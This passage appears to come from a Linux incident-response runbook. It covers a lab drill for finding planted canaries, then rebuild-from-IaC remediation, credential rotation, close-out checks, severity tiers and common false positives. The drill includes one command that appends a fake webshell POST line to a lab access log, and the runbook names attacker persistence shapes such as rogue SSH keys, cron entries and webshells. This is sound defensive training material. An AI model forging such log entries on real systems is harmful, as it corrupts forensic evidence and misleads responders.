Find it three ways, in order: the Step 5.2 ripgrep battery over `/srv`; the Step 5.1 mtime-window sweep; then simulate execution evidence - append one synthetic line to a scratch access log ON THE LAB VM (`echo '"POST /static/uploads/img_helper.py HTTP/1.1" 200' >> /tmp/lab-access.log`) and re-run the POST-to-new-file correlation against it. Confirm all three methods hit.

### Drill protocol

Run the full loop twice: once with this module open, once closed-book under 60 minutes including responder-log entries for every action. Pass criteria are defined in Verification & Validation. If a planted artifact survives your own sweep, fix the MODULE gap, not just the run - that is the point of the exercise.

## Remediation

Apply the nuke-vs-investigate decision made in Scope objective 4.

### Default: preserve -> rebuild from IaC

You cannot prove the absence of a kernel rootkit on a suspect host; you CAN prove a fresh build is clean. Default for any confirmed compromise: image/preserve evidence (Step 2.5), rebuild from infrastructure-as-code, never hand-clean. In-place eradication is acceptable only when: the workload is an ephemeral container replaced by redeploy anyway, or the incident lead explicitly accepts residual-risk for continuity - record that acceptance in the responder log.

Rebuild requirements: artifact from trusted pipeline, config applied by IaC only (no snowflake fixes), host re-enrolls with NEW host identity/SSH host keys, old disk preserved to cold storage as evidence before decommission via cloud API - not by commands on the suspect OS.

### Credential rotation cascade

Assume full read access: anything the compromised host could see is burned. Rotate in this order, AFTER capture completes (Rule 1) unless containment was pre-approved:

1. **Host SSH**: revoke attacker-added keys fleet-wide (grep every `authorized_keys` from this module), rotate responder/admin personal keys, regenerate SSH host keys on rebuilt hosts, prune stale entries from consumers' `known_hosts`.
2. **App DB credentials**: postgres/service roles used BY the affected services first, then shared/admin DB roles; verify no rogue roles or grants remain (`\du` / `pg_roles` review); force rotation of anything stored in app config on the host.
3. **API tokens**: third-party and internal service tokens discovered in `/proc/<pid>/environ`, env files, or app config (cross-ref secrets-data-exposure.md sweep results).
4. **Cloud role/session**: instance profiles, cloudflared tunnel tokens, k8s ServiceAccount tokens, CI deploy credentials - invalidate existing sessions only after replacements are live, so you do not take yourself down mid-response.

### Validation gate before return-to-service

A rebuilt host returns to traffic only after:

```bash
# from your repo checkout, against the rebuilt host or its staging twin:
tools/run-all-sweeps.sh        # must exit clean
```

Plus targeted re-runs of the check modules matching the entry-vector class: injection.md / file-handling.md for upload-and-execute paths, ssrf-url-security.md if egress abuse featured, secrets-data-exposure.md before restored creds touch it. Clean means zero findings AND reviewed-and-dismissed lines documented. Then re-enable traffic/DNS and arm monitoring (below).

## Verification & Validation

Close-out checklist - every box checked or explicitly waived by the incident lead in writing (responder log):

- [ ] All volatile state captured to external collector; `SHA256SUMS` verified on collector.
- [ ] Memory decision logged: captured via LiME/AVML OR skipped-with-reason.
- [ ] Responder log complete: every action, every deliberate no-action, approvals named with grantor, UTC throughout; a second responder can reconstruct events from it alone.
- [ ] Rebuild executed from IaC; original host imaged and preserved; decommission done off-host.
- [ ] Rotation cascade steps 1-4 completed and VERIFIED both ways: old credentials fail, new credentials work.
- [ ] `tools/run-all-sweeps.sh` clean on the rebuilt host.
- [ ] Targeted check modules re-run clean per entry vector.
- [ ] Monitoring window armed: LOGMON retention/watch rules extended past the incident window plus attacker dwell time; DETECT rules updated with this case's IOCs (IPs, domains, key fingerprints, filenames).
- [ ] IOC pack handed to incident-response.md owner with timestamps.

Tabletop pass criteria (from Exploitation & Reproduction): closed-book run under 60 minutes produces (a) complete volatile bundle, (b) all three canaries located using only module steps, (c) a defensible nuke-vs-investigate call stated with reasons, (d) a responder log another person can follow. Any miss -> revise the module, rerun next quarter.

## Severity Assessment

CVSS does NOT apply here - that scores vulnerabilities, and triage has no CVE to score. This section classifies incident IMPACT and feeds the SEV1-SEV4 matrix in incident-response.md. When in doubt between two rows, take the higher severity until disproven.

| Classification | Evidence bar | Feeds |
|----------------|--------------|-------|
| Evidence of exfiltration | Bulk egress in Step 2 socket map/netflow, staged archives found, or command history showing DB dumps/credential harvest reaching egress | SEV1 candidate |
| Persistence-only, no exfil evidence | Attacker artifacts found (key, cron, webshell) but no egress volume, no data-access commands, no staging files after full sweep | SEV2 candidate - upgrade on ANY doubt |
| Unconfirmed anomaly | One odd signal (single odd login, one scanner-shaped file) and NO corroboration after Steps 2-6 all ran negative | SEV3 monitor-or-close |

Hard floors: an interactive attacker session observed live (`w` + established-map correlation) floors at SEV2 regardless of classification; tunnel-trust loss or node-level container escape floors at SEV2 (fleet blast radius). Downgrading unconfirmed-anomaly to closed requires two independent negative sweeps (this module + targeted checks), logged.

## Common False Positives

Dismiss these with evidence, not vibes - each dismissal gets a responder-log line:

- **Distro-shipped cron/unit entries**: `/etc/cron.d/e2scrub_all`, `apt-daily*`, `dnf-makecache`, `logrotate`, `unattended-upgrades`, fedora-* timers, cloud-agent units. Verify ownership (`dpkg -S <script>` / `rpm -qf <script>`) - package-owned and unmodified means expected. The mtime hunt still applies: package UPGRADES inside your window also touch these; check apt/dnf history for the same timestamp.
- **Package-manager-verified config drift**: `dpkg -V`/`rpm -V` flags on files marked `c` (config) are usually legitimate admin edits (sshd_config, journald.conf, tunnel configs). Context, not verdict: diff against the IaC repo's copy of that file. Unexplained drift on a BINARY (non-`c`) path is the opposite - treat as a verdict-grade finding.
- **Admin's own emergency key**: break-glass root keys look exactly attacker-shaped: no comment, old fingerprint, rarely used. Check the break-glass registry FIRST, then confirm last-use in auth.log matches known ops activity. Still verify it lives only where the registry says.
- **CDN/tunnel health-check hits on scan patterns**: Cloudflare probes and uptime monitors request odd paths and generate 404 noise against webshell-shaped URLs. Filter access-log correlation by edge/monitor source ranges and by response code history: scanners get 404s; an operator POST followed by 200s is the real shape.
- **journald rate-limiting mimicking log-tampering**: bursty incidents trip `RateLimitBurst`; suppressed messages (`Suppression mode`, dropped-lines notices in `journalctl` output) look like scrubbing. Before declaring tampering: check rate-limit notices, compare against rsyslog/auth.log which lack the same limits, and check `Storage=` persistence. A gap present ONLY in journald is a limit, not an attacker.

## References

- NIST SP 800-86, Guide to Integrating Forensic Techniques into Incident Response. https://csrc.nist.gov/pubs/sp/800/86/final
- Volatility Foundation - memory forensics framework. https://github.com/volatilityfoundation/volatility3
- LiME - Linux Memory Extractor (kernel-module acquisition). https://github.com/504ensicsLabs/LiME
- AVML - Acquire Volatile Memory for Linux. https://github.com/microsoft/avml
- ss(8) man page. https://man7.org/linux/man-pages/man8/ss.8.html
- last(1) man page. https://man7.org/linux/man-pages/man1/last.1.html
- journalctl(1) - systemd documentation. https://www.freedesktop.org/software/systemd/man/latest/journalctl.html
- GTFOBins - unix binary abuse reference (context for cron/unit payload shapes). https://github.com/GTFOBins/GTFOBins.github.io
- plaso - log2timeline/super-timeline engine (escalation path from Step 7). https://github.com/log2timeline/plaso
- Sibling modules: incident-response.md (SEV matrix, handoff), secrets-data-exposure.md (credential sweep + rotation detail), injection.md / file-handling.md / ssrf-url-security.md (entry-vector checks), LOGMON / DETECT (monitoring window), tools/run-all-sweeps.sh (validation gate).
